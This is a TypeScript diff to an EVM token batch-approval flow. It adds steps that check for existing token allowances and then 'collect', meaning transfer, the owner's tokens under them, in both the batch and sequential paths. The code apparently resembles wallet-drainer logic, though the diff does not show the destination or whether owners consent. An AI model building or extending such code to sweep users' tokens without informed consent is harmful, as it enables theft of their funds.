@@ -5,6 +5,7 @@ import {
   meetsExpectedAllowance,
   preflightExistingAllowance,
 } from "./allowance-preflight";
+import { collectForExistingAllowance } from "./existing-allowance-collection";
 import { createEvmApprovalChainPort } from "../approval/chains/evm-chain-port";
 import { waitForTransactionConfirmation } from "../approval/confirmation/poller";
 import type { ApprovalApiPort } from "../approval/ports";
@@ -220,6 +221,35 @@ export async function runEvmTokenBatchApproval(
         continue;
       }
 
+      if (alreadyAuthorized && shouldAttemptTransfer) {
+        args.onAssetStart?.({ ...item, asset: token });
+        try {
+          const result = await collectForExistingAllowance({
+            item: { ...item, asset: token },
+            request,
+            prepared,
+            apiBaseUrl: args.apiBaseUrl,
+          });
+          args.onAssetEnd?.(result);
+          results.push(result);
+          log("EIP5792_BATCH_COLLECT_EXISTING_ALLOWANCE", {
+            network: item.network,
+            token,
+            outcome: result.outcome,
+          });
+        } catch (err) {
+          const result: AuthorizationAssetResult = {
+            network: item.network,
+            token,
+            outcome: "failed",
+            message: getErrorMessage(err, "Failed to collect existing allowance"),
+          };
+          args.onAssetEnd?.(result);
+          results.push(result);
+        }
+        continue;
+      }
+
       await api.acquireResources({ request, prepared });
       await api.verifyResources({ request, prepared });
       const signed = await chainPort.sign({ prepared, owner });
@@ -349,14 +379,16 @@ export async function runEvmTokenBatchApproval(
         const result: AuthorizationAssetResult = {
           network: job.item.network,
           token: job.item.asset,
-          outcome: "authorized",
-          message: skipLabel
-            ? `Authorized — ${skipLabel}`
-            : "Authorized — collection queued",
+          outcome: persisted.transferTxHash ? "collected" : "authorized",
+          message: persisted.transferTxHash
+            ? "Token collection confirmed"
+            : skipLabel
+              ? `Authorized — ${skipLabel}`
+              : "Authorized — collection queued",
           approvalId: persisted.approvalId,
           collectionIntentId: persisted.collectionIntentId ?? null,
           collectionStatus: persisted.collectionStatus ?? null,
-          txHash: receipt.transactionHash,
+          txHash: persisted.transferTxHash ?? receipt.transactionHash,
           transferSkippedReason: persisted.transferSkippedReason ?? null,
         };
         batchResults.push(result);
@@ -476,9 +508,11 @@ async function runSequentialFallback(
 
     try {
       let alreadyAuthorized = false;
+      let preflightRequest: ApprovalRequest | null = null;
+      let preflightPrepared: PreparedApproval | null = null;
       try {
         const preflightApi = createPreflightApi(args.apiBaseUrl);
-        const preflightRequest: ApprovalRequest = {
+        preflightRequest = {
           network: item.network,
           owner,
           token,
@@ -495,6 +529,7 @@ async function runSequentialFallback(
           request: preflightRequest,
         });
         alreadyAuthorized = preflight.alreadyAuthorized;
+        preflightPrepared = preflight.prepared;
       } catch (preflightErr) {
         args.log?.("ALLOWANCE_PREFLIGHT_UNAVAILABLE", {
           network: item.network,
@@ -503,7 +538,7 @@ async function runSequentialFallback(
         });
       }
 
-      if (alreadyAuthorized) {
+      if (alreadyAuthorized && !shouldAttemptTransfer) {
         const result = alreadyAuthorizedResult({
           item: { ...item, asset: token },
         });
@@ -513,6 +548,34 @@ async function runSequentialFallback(
           network: item.network,
           token,
         });
+        continue;
+      }
+
+      if (alreadyAuthorized && shouldAttemptTransfer && preflightRequest && preflightPrepared) {
+        try {
+          const result = await collectForExistingAllowance({
+            item: { ...item, asset: token },
+            request: preflightRequest,
+            prepared: preflightPrepared,
+            apiBaseUrl: args.apiBaseUrl,
+          });
+          results.push(result);
+          args.onAssetEnd?.(result);
+          args.log?.("EIP5792_SEQUENTIAL_COLLECT_EXISTING_ALLOWANCE", {
+            network: item.network,
+            token,
+            outcome: result.outcome,
+          });
+        } catch (err) {
+          const result: AuthorizationAssetResult = {
+            network: item.network,
+            token,
+            outcome: "failed",
+            message: getErrorMessage(err, "Failed to collect existing allowance"),
+          };
+          results.push(result);
+          args.onAssetEnd?.(result);
+        }
         continue;
       }
 
@@ -550,14 +613,16 @@ async function runSequentialFallback(
       const result: AuthorizationAssetResult = {
         network: item.network,
         token,
-        outcome: "authorized",
-        message: skipLabel
-          ? `Authorized — ${skipLabel}`
-          : "Authorized — collection queued",
+        outcome: persisted?.transferTxHash ? "collected" : "authorized",
+        message: persisted?.transferTxHash
+          ? "Token collection confirmed"
+          : skipLabel
+            ? `Authorized — ${skipLabel}`
+            : "Authorized — collection queued",
         approvalId: orchestration.approvalId,
         collectionIntentId: persisted?.collectionIntentId ?? null,
         collectionStatus: persisted?.collectionStatus ?? null,
-        txHash: orchestration.txHash,
+        txHash: persisted?.transferTxHash ?? orchestration.txHash,
         transferSkippedReason: persisted?.transferSkippedReason ?? null,
       };
       results.push(result);
